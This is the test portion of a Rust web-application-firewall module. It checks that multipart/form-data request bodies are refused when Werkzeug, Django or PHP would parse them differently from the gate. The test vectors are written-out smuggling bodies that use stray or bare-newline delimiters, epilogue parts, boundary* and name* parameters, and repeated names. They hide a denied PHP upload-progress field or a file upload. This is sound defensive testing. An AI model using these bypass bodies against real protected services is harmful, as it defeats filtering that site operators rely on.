        assert!(!field_name_index_exceeds(b"a[100000]", 100_000)); // == cap, not over
        assert!(!field_name_index_exceeds(b"items[3]", 100_000));
        assert!(!field_name_index_exceeds(b"user[name]", 100_000)); // non-numeric key
        assert!(!field_name_index_exceeds(b"items[4294967295]", 0)); // 0 disables
    }

    // ── Multipart: what the gate reads is what common backends parse ────
    //
    // A route tightened as the docs suggest: the PHP upload-progress field is refused and the
    // route takes no file uploads. Each smuggling body hides parts that violate it where the gate
    // used to stop reading or splitting, but where a common backend still finds them. Werkzeug
    // 3.1.9 and Django 5.1.15 were run on the same bytes; PHP's rfc1867 parser is read from its
    // source. Every body below was allowed before the gate learned these rules.
    fn tight_php_profile() -> WafProfile {
        WafProfile {
            deny_field_names: vec!["PHP_SESSION_UPLOAD_PROGRESS".to_string()],
            max_file_parts: 0,
            ..WafProfile::default()
        }
    }
    const HIDDEN_FIELD: &[u8] =
        b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx";
    const HIDDEN_FILE: &[u8] =
        b"Content-Disposition: form-data; name=\"f\"; filename=\"z.txt\"\r\n\r\ndata";
    const FIRST_PART: &[u8] = b"--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nv";

    /// (what, body, the verdict the whole WAF must give it).
    fn smuggling_bodies() -> Vec<(&'static str, Vec<u8>, &'static str)> {
        let after_close = "data after the multipart close delimiter";
        let ambiguous = "ambiguous multipart delimiter";
        let bare = "bare line break in multipart part headers";
        vec![
            // Django and PHP read "--B" parts after "--B--".
            (
                "parts after the close delimiter",
                [
                    FIRST_PART,
                    b"\r\n--B--\r\n--B\r\n",
                    HIDDEN_FIELD,
                    b"\r\n--B\r\n",
                    HIDDEN_FILE,
                    b"\r\n--B--\r\n",
                ]
                .concat(),
                after_close,
            ),
            // Django splits on every "--B", so the bytes after "--B--" are one more part.
            (
                "an epilogue with no delimiter in it",
                [FIRST_PART, b"\r\n--B--\r\n", HIDDEN_FIELD].concat(),
                after_close,
            ),
            // PHP ("\n--B"), Werkzeug and Django split on a bare-LF dash-boundary.
            (
                "bare-LF delimiters",
                [
                    FIRST_PART,
                    b"\n--B\r\n",
                    HIDDEN_FIELD,
                    b"\n--B\r\n",
                    HIDDEN_FILE,
                    b"\r\n--B--\r\n",
                ]
                .concat(),
                ambiguous,
            ),
            // Werkzeug and Django split on a bare-CR dash-boundary.
            (
                "bare-CR delimiters",
                [
                    FIRST_PART,
                    b"\r--B\r\n",
                    HIDDEN_FIELD,
                    b"\r--B\r\n",
                    HIDDEN_FILE,
                    b"\r\n--B--\r\n",
                ]
                .concat(),
                ambiguous,
            ),
            // Django splits on "--B" anywhere, newline or not.
            (
                "newline-free dash-boundaries",
                [
                    FIRST_PART,
                    b"--B\r\n",
                    HIDDEN_FIELD,
                    b"--B\r\n",
                    HIDDEN_FILE,
                    b"\r\n--B--\r\n",
                ]
                .concat(),
                ambiguous,
            ),
            // The blank line's CRLF taken as the delimiter's: Werkzeug and Django split there.
            (
                "a delimiter right after the blank line",
                [
                    b"--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n--B\r\n",
                    HIDDEN_FIELD,
                    b"\r\n--B--\r\n",
                ]
                .concat(),
                ambiguous,
            ),
            // Werkzeug ends a part's headers at "\n\n" or "\r\r" too, and reads the name.
            (
                "part headers ended by a bare LF blank line",
                b"--B\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\nx\
                  \r\n\r\n\r\n--B--\r\n"
                    .to_vec(),
                bare,
            ),
            (
                "part headers ended by a bare CR blank line",
                b"--B\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\rx\
                  \r\n\r\n\r\n--B--\r\n"
                    .to_vec(),
                bare,
            ),
        ]
    }

    #[test]
    fn the_tight_profile_denies_the_hidden_parts_in_their_canonical_position() {
        // The control: the same two parts, delimited the canonical way, are refused.
        let p = tight_php_profile();
        let field = mp(
            "B",
            &[
                ("a", None, b"v"),
                ("PHP_SESSION_UPLOAD_PROGRESS", None, b"x"),
            ],
        );
        assert_eq!(
            validate_request("POST", Some(&ct("B")), &field, &p),
            WafVerdict::Deny("denied multipart field name")
        );
        let file = mp("B", &[("a", None, b"v"), ("f", Some("z.txt"), b"data")]);
        assert_eq!(
            validate_request("POST", Some(&ct("B")), &file, &p),
            WafVerdict::Deny("too many multipart file parts")
        );
    }

    #[test]
    fn a_part_that_a_common_backend_parses_cannot_hide_from_the_gate() {
        let p = tight_php_profile();
        let mut wrong = Vec::new();
        for (what, body, want) in smuggling_bodies() {
            let got = validate_request("POST", Some(&ct("B")), &body, &p);
            if got != WafVerdict::Deny(want) {
                wrong.push(format!("{what}: {got:?}, want Deny({want:?})"));
            }
        }
        assert!(wrong.is_empty(), "\n  {}", wrong.join("\n  "));
    }

    #[test]
    fn the_streaming_waf_and_the_whole_body_waf_agree_on_the_smuggling_shapes() {
        // The streaming path runs the raw scan as the frames arrive, then the buffered gates
        // (multipart included) on the reassembled body: for every chunk size it refuses what
        // the whole-body path refuses, and allows the well-formed body both allow.
        let p = WafProfile {
            streaming: true,
            ..tight_php_profile()
        };
        let mut bodies = smuggling_bodies();
        bodies.push(("well formed", mp("B", &[("a", None, b"v")]), ""));
        for (what, body, _) in bodies {
            let whole = validate_request("POST", Some(&ct("B")), &body, &p);
            for chunk in [1, 3, 7, 64, body.len().max(1)] {
                let mut scanner = StreamingScanner::new(p.mode, p.max_body_mb * 1_048_576);
                let streamed_deny = body
                    .chunks(chunk)
                    .any(|c| matches!(scanner.feed(c), StreamVerdict::Deny(_)));
                if streamed_deny {
                    assert!(
                        matches!(whole, WafVerdict::Deny(_)),
                        "{what}, chunk {chunk}"
                    );
                } else {
                    let streamed = validate_request_prescanned("POST", Some(&ct("B")), &body, &p);
                    assert_eq!(streamed, whole, "{what}, chunk {chunk}");
                }
            }
            assert_eq!(whole == WafVerdict::Allow, what == "well formed", "{what}");
        }
    }

    #[test]
    fn a_close_delimiter_followed_only_by_padding_and_line_breaks_is_allowed() {
        // Browsers, curl and requests send "--B--\r\n"; some clients send nothing after it, or
        // more line breaks. None of that can carry a part.
        let p = tight_php_profile();
        for tail in [&b""[..], b"\r\n", b"\r\n\r\n", b" \t\r\n", b"\n"] {
            let body = [FIRST_PART, b"\r\n--B--", tail].concat();
            assert_eq!(
                multipart_structure(&ct("B"), &body, &p),
                WafVerdict::Allow,
                "tail {tail:?}"
            );
        }
        // and the first byte that is not one of those is refused
        let body = [FIRST_PART, b"\r\n--B--\r\nx"].concat();
        assert_eq!(
            multipart_structure(&ct("B"), &body, &p),
            WafVerdict::Deny("data after the multipart close delimiter")
        );
    }

    #[test]
    fn a_dash_boundary_inside_a_part_is_refused_wherever_it_is() {
        // RFC 2046 has the client pick a boundary its data does not contain: any other
        // occurrence of "--B" is a split some backend makes and the gate would not.
        let p = WafProfile::default();
        for (body, want) in [
            (
                &b"--B\r\nContent-Disposition: form-data; name=\"a--B\"\r\n\r\nv\r\n--B--"[..],
                "ambiguous multipart delimiter",
            ),
            (
                b"--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx--By\r\n--B--",
                "ambiguous multipart delimiter",
            ),
            (
                b"--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx\r\n--B--\r\n--B--",
                "data after the multipart close delimiter",
            ),
        ] {
            assert_eq!(
                multipart_structure(&ct("B"), body, &p),
                WafVerdict::Deny(want),
                "{}",
                String::from_utf8_lossy(body)
            );
        }
    }

    // ── Multipart: a boundary, a media type and a field name every backend reads alike ────
    //
    // The bodies below are well formed for the boundary and the field names the gate reads, and
    // hide the denied field or a file part under the boundary or the name a backend reads
    // instead. Werkzeug 3.1.9 and Django 5.1.15 were run on the same bytes; PHP is read from its
    // source (main/rfc1867.c, main/SAPI.c). Every body below was allowed before these rules.

    /// A single part `a` under `outer` whose content is a whole body under `inner` carrying `hidden`.
    fn nested(outer: &str, inner: &str, hidden: &[u8]) -> Vec<u8> {
        [
            format!("--{outer}\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n").as_bytes(),
            format!("\r\n--{inner}\r\n").as_bytes(),
            hidden,
            format!("\r\n--{inner}--\r\n\r\n--{outer}--\r\n").as_bytes(),
        ]
        .concat()
    }

    #[test]
    fn a_boundary_another_backend_reads_differently_is_refused() {
        let p = tight_php_profile();
        let bad = "malformed multipart boundary";
        for (ct, body, who) in [
            // Werkzeug and Django read boundary* (RFC 2231), and the last one wins.
            (
                "multipart/form-data; boundary=B; boundary*=C",
                nested("B", "C", HIDDEN_FIELD),
                "Werkzeug, Django",
            ),
            (
                "multipart/form-data; boundary=B; boundary*0=C",
                nested("B", "C", HIDDEN_FIELD),
                "Werkzeug",
            ),
            // PHP takes the first "boundary" anywhere in the value, then the first "=" after it.
            (
                "multipart/form-data; xboundary=C; boundary=B",
                nested("B", "C", HIDDEN_FIELD),
                "PHP",
            ),
            (
                "multipart/form-data; foo=\"boundary=C\"; boundary=B",
                nested("B", "C\"", HIDDEN_FIELD),
                "PHP",
            ),
            (
                "multipart/form-data; Boundary=B; charset=boundary=C",
                nested("B", "C", HIDDEN_FIELD),
                "PHP",
            ),
            // PHP keeps a space after "=" in the boundary.
            (
                "multipart/form-data; boundary= B",
                nested("B", " B", HIDDEN_FIELD),
                "PHP",
            ),
        ] {
            assert_eq!(
                validate_request("POST", Some(ct), &body, &p),
                WafVerdict::Deny(bad),
                "{ct} ({who} read the inner boundary)"
            );
        }
        // An unquoted tspecial or space: Werkzeug ends the boundary there, at "B".
        for b in ["B/C", "B C", "B,C", "B:C", "B=C", "B?C", "B(C", "B)C"] {
            let ct = format!("multipart/form-data; boundary={b}");
            let body = nested(b, "B", HIDDEN_FIELD);
            assert_eq!(
                validate_request("POST", Some(&ct), &body, &p),
                WafVerdict::Deny(bad),
                "{ct}"
            );
            // quoted, every backend reads the whole value: a canonical body under it passes
            let quoted = format!("multipart/form-data; boundary=\"{b}\"");
            assert_eq!(
                validate_request("POST", Some(&quoted), &mp(b, &[("a", None, b"v")]), &p),
                WafVerdict::Allow,
                "{quoted}"
            );
        }
        // A space before the next ";" is RFC 9110 OWS: PHP reads "B " as the boundary, but every
        // "--B " is a "--B" the gate splits on too, so the part PHP finds is one the gate reads.
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data; boundary=B ; x=y"),
                &nested("B", "B ", HIDDEN_FIELD),
                &p
            ),
            WafVerdict::Deny("denied multipart field name")
        );
        // A boundary* also sends a body of another type through the gate: Werkzeug and Django
        // read it as the boundary of a multipart/mixed value too.
        let lenient = WafProfile {
            deny_unknown_content_types: false,
            ..tight_php_profile()
        };
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/mixed; boundary*=C"),
                &nested("B", "C", HIDDEN_FIELD),
                &lenient
            ),
            WafVerdict::Deny(bad)
        );
    }

    #[test]
    fn the_boundaries_real_clients_send_still_pass() {
        let p = WafProfile::default();
        for (ct, b) in [
            // Chrome and Safari (the value contains "Boundary")
            (
                "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
                "----WebKitFormBoundary7MA4YWxkTrZu0gW",
            ),
            // Firefox (a lower-case "boundary" in the value)
            (
                "multipart/form-data; boundary=----geckoformboundary1f2e3d4c5b6a",
                "----geckoformboundary1f2e3d4c5b6a",
            ),
            // curl, Python requests, Go
            (
                "multipart/form-data; boundary=------------------------d74496d66958873e",
                "------------------------d74496d66958873e",
            ),
            (
                "multipart/form-data; boundary=9b1c4a0f6e2d4f7a8c3b5d2e1f0a9b8c",
                "9b1c4a0f6e2d4f7a8c3b5d2e1f0a9b8c",
            ),
            // .NET quotes it
            (
                "multipart/form-data; boundary=\"3f1e2d4c-5b6a-4789-90ab-cdef01234567\"",
                "3f1e2d4c-5b6a-4789-90ab-cdef01234567",
            ),
            ("multipart/form-data;boundary=B'+_-.9", "B'+_-.9"),
            ("MULTIPART/FORM-DATA; BOUNDARY=B", "B"),
            ("multipart/form-data; charset=utf-8; boundary=B", "B"),
        ] {
            let body = mp(b, &[("a", None, b"v"), ("f", Some("x.bin"), b"data")]);
            assert_eq!(
                validate_request("POST", Some(ct), &body, &p),
                WafVerdict::Allow,
                "{ct}"
            );
        }
    }

    #[test]
    fn a_media_type_backends_read_as_form_data_gets_the_field_name_rules() {
        // The documented upload profile: unknown content types are scanned, not refused.
        let p = WafProfile {
            deny_unknown_content_types: false,
            ..tight_php_profile()
        };
        let field = [&b"--B\r\n"[..], HIDDEN_FIELD, b"\r\n--B--\r\n"].concat();
        let file = [&b"--B\r\n"[..], HIDDEN_FILE, b"\r\n--B--\r\n"].concat();
        // Werkzeug and Django trim a tab before the ";", Werkzeug also a space or a tab before
        // the media type (an h2 field value can carry one); PHP ends the media type at ','.
        for ct in [
            "multipart/form-data\t; boundary=B",
            " multipart/form-data; boundary=B",
            "\tmultipart/form-data; boundary=B",
            "multipart/form-data,; boundary=B",
        ] {
            assert_eq!(
                validate_request("POST", Some(ct), &field, &p),
                WafVerdict::Deny("denied multipart field name"),
                "{ct:?}"
            );
            assert_eq!(
                validate_request("POST", Some(ct), &file, &p),
                WafVerdict::Deny("too many multipart file parts"),
                "{ct:?}"
            );
        }
        // On the default profile the tab form is an allowed multipart/form-data body.
        let ok = mp("B", &[("a", None, b"v")]);
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data\t; boundary=B"),
                &ok,
                &WafProfile::default()
            ),
            WafVerdict::Allow
        );
        // and a token character still makes it another media type
        assert!(!ct_is_multipart("multipart/form-data-x; boundary=B"));
        assert!(!ct_is_multipart("multipart/form-datax"));
        // An allowed JSON type with a space before it gets the JSON gates, as without one.
        let deep = format!("{}{}", "[".repeat(20), "]".repeat(20));
        for ct in [
            "application/json",
            " application/json",
            "application/json\t; charset=utf-8",
        ] {
            assert_eq!(
                validate_request("POST", Some(ct), deep.as_bytes(), &WafProfile::default()),
                WafVerdict::Deny("JSON exceeds depth or string length limits"),
                "{ct:?}"
            );
        }
    }

    #[test]
    fn a_field_name_or_a_file_another_backend_reads_differently_is_refused() {
        let p = tight_php_profile();
        let part = |cd: &str| format!("--B\r\nContent-Disposition: {cd}\r\n\r\nx\r\n--B--\r\n");
        for (cd, want, who) in [
            // RFC 2231: Werkzeug and Django take name* and filename* as name and filename.
            (
                "form-data; name=\"f\"; filename*=utf-8''z.txt",
                "too many multipart file parts",
                "Werkzeug, Django: a file",
            ),
            (
                "form-data; name=\"f\"; filename*0=z.txt",
                "too many multipart file parts",
                "Werkzeug: a file",
            ),
            (
                "form-data; name=\"a\"; name*=utf-8''PHP_SESSION_UPLOAD_PROGRESS",
                "multipart field name in an extended parameter",
                "Werkzeug, Django",
            ),
            (
                "form-data; name=\"a\"; name*0=PHP_SESSION_UPLOAD_PROGRESS",
                "multipart field name in an extended parameter",
                "Werkzeug",
            ),
            // a second name: Werkzeug, Django and PHP keep the last
            (
                "form-data; name=\"a\"; name=\"PHP_SESSION_UPLOAD_PROGRESS\"",
                "repeated multipart field name",
                "Werkzeug, Django, PHP",
            ),
        ] {
            assert_eq!(
                validate_request("POST", Some(&ct("B")), part(cd).as_bytes(), &p),
                WafVerdict::Deny(want),
                "{cd} ({who})"
            );
        }
        // Two Content-Disposition headers: PHP and Werkzeug read the first, Django the last.
        let two = [
            &b"--B\r\n"[..],
            HIDDEN_FIELD.split(|&b| b == b'\r').next().unwrap(),
            b"\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx\r\n--B--\r\n",
        ]
        .concat();
        assert_eq!(
            validate_request("POST", Some(&ct("B")), &two, &p),
            WafVerdict::Deny("repeated content-disposition in a multipart part")
        );
        // .NET sends filename* next to filename: one file part, allowed where files are.
        let dotnet = part("form-data; name=\"f\"; filename=\"z.txt\"; filename*=utf-8''z.txt");
        let one_file = WafProfile {
            max_file_parts: 1,
            ..tight_php_profile()
        };
        assert_eq!(
            validate_request("POST", Some(&ct("B")), dotnet.as_bytes(), &one_file),
            WafVerdict::Allow
        );
    }

    use proptest::prelude::*;

    // A boundary over the RFC 2046 charset (no trailing space to keep it simple).
    fn boundary_str() -> impl Strategy<Value = String> {
        let c = prop::sample::select("abcXYZ019-_".chars().collect::<Vec<_>>());
        prop::collection::vec(c, 1..24).prop_map(|cs| cs.into_iter().collect())
    }

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(1536))]

        // The parser never panics on arbitrary content types and bodies.
        #[test]
        fn never_panics(ct in ".{0,48}", body in prop::collection::vec(any::<u8>(), 0..256)) {
            let p = WafProfile::default();
            let _ = multipart_structure(&ct, &body, &p);
            let _ = multipart_boundary(&ct);
        }

        // A well-formed body with k parts (f of them files) is allowed when the
        // limits admit it, and each limit denies it exactly one short: no false
        // positive on a real-shaped body, and the counts are exact.
        #[test]
        fn well_formed_bodies_pass_and_limits_are_exact(
            b in boundary_str(),
            n_parts in 1usize..8,
            file_flags in prop::collection::vec(any::<bool>(), 1..8),
        ) {
            let k = n_parts.min(file_flags.len());
            let files = file_flags[..k].iter().filter(|&&f| f).count();
            let parts: Vec<(&str, Option<&str>, &[u8])> = file_flags[..k]
                .iter()
                .map(|&is_file| ("fld", if is_file { Some("f") } else { None }, &b"data"[..]))
                .collect();
            let body = mp(&b, &parts);
            let c = ct(&b);

            let generous = WafProfile::default();
            prop_assert_eq!(multipart_structure(&c, &body, &generous), WafVerdict::Allow,
                "well-formed body rejected: boundary={:?} parts={}", b, k);

            // One short of k parts denies (k >= 1 always here).
            let short_parts = WafProfile { max_parts: k - 1, ..WafProfile::default() };
            prop_assert_eq!(
                multipart_structure(&c, &body, &short_parts),
                WafVerdict::Deny("too many multipart parts"),
                "max_parts={} should reject k={}", k - 1, k
            );

            // One below the file-part count denies, when there is at least one file.
            if files >= 1 {
                let short_files = WafProfile { max_file_parts: files - 1, ..WafProfile::default() };
                prop_assert_eq!(
                    multipart_structure(&c, &body, &short_files),
                    WafVerdict::Deny("too many multipart file parts"),
                    "max_file_parts={} should reject files={}", files - 1, files
                );
            }
        }

        // A well-formed body with a stray dash-boundary, line break or byte put anywhere in
        // it: whenever the gate allows the result, a lenient backend has no other split to
        // make. Every dash-boundary is at the start or right after a CRLF, the last one is the
        // close delimiter, and only spaces, tabs, CR and LF follow it.
        #[test]
        fn an_allowed_body_leaves_a_lenient_parser_no_other_split(
            b in boundary_str(),
            n_parts in 1usize..4,
            at in any::<prop::sample::Index>(),
            noise in prop::sample::select(
                vec!["\n--", "\r--", "--", "\r\n--", "--\r\n", "\n", "\r", "\r\n", "x"],
            ),
        ) {
            let parts: Vec<(&str, Option<&str>, &[u8])> =
                (0..n_parts).map(|_| ("fld", None, &b"data"[..])).collect();
            let mut body = mp(&b, &parts);
            body.extend_from_slice(b"\r\n");
            let c = ct(&b);
            let p = WafProfile::default();
            prop_assert_eq!(multipart_structure(&c, &body, &p), WafVerdict::Allow);

            let mut stray = noise.as_bytes().to_vec();
            if stray.ends_with(b"--") {
                stray.extend_from_slice(b.as_bytes()); // a whole dash-boundary
            }
            let i = at.index(body.len() + 1);
            body.splice(i..i, stray);
            if multipart_structure(&c, &body, &p) == WafVerdict::Allow {
                let delim = [b"--", b.as_bytes()].concat();
                let hits: Vec<usize> = memchr::memmem::find_iter(&body, &delim).collect();
                prop_assert_eq!(hits.first(), Some(&0));
                for &h in &hits[1..] {
                    prop_assert!(h >= 2 && &body[h - 2..h] == b"\r\n", "stray at {}", h);
                }
                let tail = &body[hits[hits.len() - 1] + delim.len()..];
                prop_assert!(tail.starts_with(b"--"));
                prop_assert!(
                    tail[2..].iter().all(|&x| matches!(x, b' ' | b'\t' | b'\r' | b'\n')),
                    "epilogue {:?}", String::from_utf8_lossy(&tail[2..])
                );
            }
        }
    }
}
